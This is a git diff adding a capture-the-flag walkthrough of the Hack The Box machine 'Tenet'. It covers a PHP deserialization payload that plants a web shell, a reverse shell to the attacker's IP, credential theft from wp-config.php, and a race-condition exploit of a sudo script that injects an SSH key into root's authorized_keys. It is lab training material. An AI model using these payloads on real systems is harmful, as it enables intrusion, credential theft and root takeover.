@@ -363,5 +363,317 @@ $ wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u ht
 
 // And it worked !
 
-// Next we will try to inject a command cli with $_REQUEST
+// Next we will try to inject a command cli with [$_REQUEST](https://www.w3schools.com/php/php_superglobals_request.asp)
 
+![Image 12](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Tenet/12.png)
+
+    $ cat attack2.php 
+
+    <?php
+
+    class DatabaseExport
+    {
+        public function __construct()
+        {
+            $this->user_file = 'W0lfysec.php';
+            $this->data = '<?php system($_REQUEST[\'command\']);?>';
+        }
+    }
+
+    echo urlencode(serialize(new DatabaseExport));
+    echo "\n";
+
+    ?>
+
+// And we test it same way 
+
+    $curl -i http://10.10.10.223/W0lfysec.php?command=whoami
+    HTTP/1.1 200 OK
+    Date: Thu, 16 Sep 2021 16:13:39 GMT
+    Server: Apache/2.4.29 (Ubuntu)
+    Content-Length: 9
+    Content-Type: text/html; charset=UTF-8
+
+    www-data
+
+// It worked !!!
+
+// Lets now make reverse shell 
+
+    $ cat attack3.php 
+
+    <?php
+
+    class DatabaseExport
+    {
+        public function __construct()
+        {
+            $this->user_file = 'W0lfysec.php';
+            $this->data = '<?php $sock=fsockopen("10.10.16.6",1444);exec("/bin/sh -i <&3 >&3 2>&3");?>';
+        }
+    }
+
+    echo urlencode(serialize(new DatabaseExport));
+    echo "\n";
+
+    ?>
+-------
+
+    $nc -lvnp 1444
+    listening on [any] 1444 ...
+    connect to [10.10.16.6] from (UNKNOWN) [10.10.10.223] 57626
+
+// First try with [pentestmonkey query](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) in same way we did before response with connection but dies fast...
+
+// Lets try another way, So i used bash script with php command exec ([Source GTFOBins](https://gtfobins.github.io/gtfobins/bash/))
+
+![Image 13](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Tenet/13.png)
+
+// First open a listiner
+
+    $ nc -lvnp 1444
+    listening on [any] 1444 ...
+    
+// And reapet the stages to get a shell !!
+
+    $ nc -lvnp 1444
+    listening on [any] 1444 ...
+    connect to [10.10.16.6] from (UNKNOWN) [10.10.10.223] 57628
+    bash: cannot set terminal process group (1615): Inappropriate ioctl for device
+    bash: no job control in this shell
+    www-data@tenet:/var/www/html$ id
+    id
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+    www-data@tenet:/var/www/html$ 
+
+// We not have permissions to open user.txt ...
+
+    www-data@tenet:/home/neil$ cat user.txt
+    cat user.txt
+    cat: user.txt: Permission denied
+
+// When try to search for some clues or passwords i have notice that the directory we get when got the shell
+
+// its same directory where the wordpress configurations are
+
+    www-data@tenet:/var/www/html$ ls -al
+    ls -al
+    total 44
+    drwxr-xr-x 3 www-data www-data  4096 Sep 16 15:49 .
+    drwxr-xr-x 3 root     root      4096 Dec 16  2020 ..
+    -rw-r--r-- 1 www-data www-data    72 Sep 16 16:44 W0lfysec.php
+    -rw-r--r-- 1 www-data www-data    24 Sep 16 15:39 W0lfysec.txt
+    -rw-r--r-- 1 www-data www-data 10918 Dec 16  2020 index.html
+    -rwxr-xr-x 1 www-data www-data   514 Dec 17  2020 sator.php
+    -rwxr-xr-x 1 www-data www-data   514 Dec 17  2020 sator.php.bak
+    -rw-r--r-- 1 www-data www-data     7 Sep 16 16:44 users.txt
+    -rw-r--r-- 1 www-data www-data     0 Sep 16 15:49 whoami
+    drwxr-xr-x 5 www-data www-data  4096 Sep 16 14:32 wordpress     <<<-----------------------
+    www-data@tenet:/var/www/html$ cd wordpress
+    cd wordpress
+    www-data@tenet:/var/www/html/wordpress$ ls -al
+    ls -al
+    total 228
+    drwxr-xr-x  5 www-data www-data  4096 Sep 16 14:32 .
+    drwxr-xr-x  3 www-data www-data  4096 Sep 16 15:49 ..
+    -rw-r--r--  1 www-data www-data   405 Feb  6  2020 index.php
+    -rw-r--r--  1 www-data www-data 19915 Feb 12  2020 license.txt
+    -rw-r--r--  1 www-data www-data  7278 Jun 26  2020 readme.html
+    -rw-r--r--  1 www-data www-data  7101 Jul 28  2020 wp-activate.php
+    drwxr-xr-x  9 www-data www-data  4096 Dec  8  2020 wp-admin
+    -rw-r--r--  1 www-data www-data   351 Feb  6  2020 wp-blog-header.php
+    -rw-r--r--  1 www-data www-data  2328 Oct  8  2020 wp-comments-post.php
+    -rw-r--r--  1 www-data www-data  2913 Feb  6  2020 wp-config-sample.php
+    -rw-r--r--  1 www-data www-data  3185 Jan  7  2021 wp-config.php
+    drwxr-xr-x  5 www-data www-data  4096 Sep 16 14:32 wp-content
+    -rw-r--r--  1 www-data www-data  3939 Jul 30  2020 wp-cron.php
+    drwxr-xr-x 25 www-data www-data 12288 Dec  8  2020 wp-includes
+    -rw-r--r--  1 www-data www-data  2496 Feb  6  2020 wp-links-opml.php
+    -rw-r--r--  1 www-data www-data  3300 Feb  6  2020 wp-load.php
+    -rw-r--r--  1 www-data www-data 49831 Nov  9  2020 wp-login.php
+    -rw-r--r--  1 www-data www-data  8509 Apr 14  2020 wp-mail.php
+    -rw-r--r--  1 www-data www-data 20975 Nov 12  2020 wp-settings.php
+    -rw-r--r--  1 www-data www-data 31337 Sep 30  2020 wp-signup.php
+    -rw-r--r--  1 www-data www-data  4747 Oct  8  2020 wp-trackback.php
+    -rw-r--r--  1 www-data www-data  3236 Jun  8  2020 xmlrpc.php
+
+// Now i tried to search the string 'pass' in the wordpress files
+
+    www-data@tenet:/var/www/html/wordpress$ cat index.php | grep pass
+    cat index.php | grep pass
+    www-data@tenet:/var/www/html/wordpress$ cat license.txt | grep pass
+    cat license.txt | grep pass
+    www-data@tenet:/var/www/html/wordpress$ cat readme.html | grep pass
+    cat readme.html | grep pass
+    www-data@tenet:/var/www/html/wordpress$ cat wp-config.php |grep pass
+    cat wp-config.php |grep pass
+    /** MySQL database password */
+    
+// Its seems that wp-config has a password, Lets check it out
+
+    www-data@tenet:/var/www/html/wordpress$ cat wp-config.php
+    cat wp-config.php
+    <?php
+    ...
+
+    // ** MySQL settings - You can get this info from your web host ** //
+    /** The name of the database for WordPress */
+    define( 'DB_NAME', 'wordpress' );
+
+    /** MySQL database username */
+    define( 'DB_USER', 'neil' );
+
+    /** MySQL database password */
+    define( 'DB_PASSWORD', 'Opera2112' );
+
+    /** MySQL hostname */
+    define( 'DB_HOST', 'localhost' );
+
+    ...
+
+// There is users 'neil' DB creds
+
+// Lets try to SSH to host with user neil and password Opera2112
+
+    $ ssh neil@10.10.10.223
+    Warning: Permanently added '10.10.10.223' (ECDSA) to the list of known hosts.
+    neil@10.10.10.223's password: 
+    Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)
+
+    neil@tenet:~$ id
+    uid=1001(neil) gid=1001(neil) groups=1001(neil)
+
+// Alsome ! it worked !
+
+// Lets get user flag 
+
+    neil@tenet:~$ cat user.txt 
+    ae2a70c2a6b3b95429c5693fd0674060
+
+
+### ----- Privilleges Escalation ------
+
+
+// Lets run sudo -l to check neil's sudo permissions
+
+    $ sudo -l
+    Matching Defaults entries for neil on tenet:
+        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:
+
+    User neil may run the following commands on tenet:
+        (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
+
+// Its seems we can run file called 'enableSSH.sh' with sudo and withouth password
+
+// Lets check what this file does
+
+![Image 14](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Tenet/14.png)
+
+    #!/bin/bash
+
+    checkAdded() {
+    
+        sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)
+        if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then
+            /bin/echo "Successfully added $sshName to authorized_keys file!"
+        else
+            /bin/echo "Error in adding $sshName to authorized_keys file!"
+        fi
+
+    }
+
+    checkFile() {
+        if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then
+            /bin/echo "Error in creating key file!"
+            if [[ -f $1 ]]; then /bin/rm $1; fi
+            exit 1
+        fi
+
+    }
+
+    addKey() {
+        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)
+        (umask 110; touch $tmpName)
+        /bin/echo $key >>$tmpName
+        checkFile $tmpName
+        /bin/cat $tmpName >>/root/.ssh/authorized_keys
+        /bin/rm $tmpName
+
+    }
+
+    key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
+    addKey
+    checkAdded
+
+// From first enspection it seems that elf(linux exacutable) file is added ssh_public_key to root's authorized_keys
+
+// BUT, when analyze the addkey() function i have noticed that the ssh_key get copied to authorized_keys from /tmp/ssh-XXXXXXXXXX
+
+// XXXXXX - replaced with random characters , then it deletes the rmp file. So we in kind of race condition
+
+// Since we not have write permissions on this file we need to come up with other way to inject our own ssh public key
+
+// That insert our own ssh-public-key before the elf sends it to root authorized_keys.
+
+// So i came up with idea to make a script that have a loop that insert my own key to /tmp/ssh-XXXXXXXXXX folder
+
+// Since i comftrable more with python i checked if the host has python(hoist have python3)
+
+    neil@tenet:~$ which python
+    neil@tenet:~$ which python3
+    /usr/bin/python3
+
+// First we need to generate our own ssh key
+
+    $ ssh-keygen
+----
+
+    $cat id_rsa.pub 
+    ssh-rsa AAAAB3NzaC1yc...............
+
+// Copy the key and lets make our script on the host machine(i called the script pythonS.py)
+
+    $ cat pythonS.py 
+    #!/usr/bin/python3
+
+    import os
+
+    a = 1
+
+    while a == 1:
+       os.system("echo 'ssh-rsa AAAAB3NzaC1...........' | tee /tmp/ssh* > /dev/null")
+
+// Now run the python file on the host machine
+
+    neil@tenet:~$ python3 pythonS.py 
+
+// Now run the elf for few times
+
+    neil@tenet:~$ sudo /usr/local/bin/enableSSH.sh
+    Successfully added root@ubuntu to authorized_keys file!
+    neil@tenet:~$ sudo /usr/local/bin/enableSSH.sh
+    Error in adding root@ubuntu to authorized_keys file!
+    neil@tenet:~$ sudo /usr/local/bin/enableSSH.sh
+    Successfully added root@ubuntu to authorized_keys file!
+    neil@tenet:~$ sudo /usr/local/bin/enableSSH.sh
+    Successfully added root@ubuntu to authorized_keys file!
+    neil@tenet:~$ sudo /usr/local/bin/enableSSH.sh
+    Successfully added root@ubuntu to authorized_keys file!
+    neil@tenet:~$ sudo /usr/local/bin/enableSSH.sh
+    Successfully added root@ubuntu to authorized_keys file!
+    neil@tenet:~$ sudo /usr/local/bin/enableSSH.sh
+    Successfully added root@ubuntu to authorized_keys file!
+
+// And successfuly ssh with our private key as root to the machine !
+
+    $ssh -i id_rsa root@10.10.10.223
+    Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)
+
+    root@tenet:~# 
+    
+// And we got the flag !
+
+    root@tenet:~# ls
+    root.txt
+    root@tenet:~# cat root.txt
+    39b353f6ea100d1250cc8077645da3e9
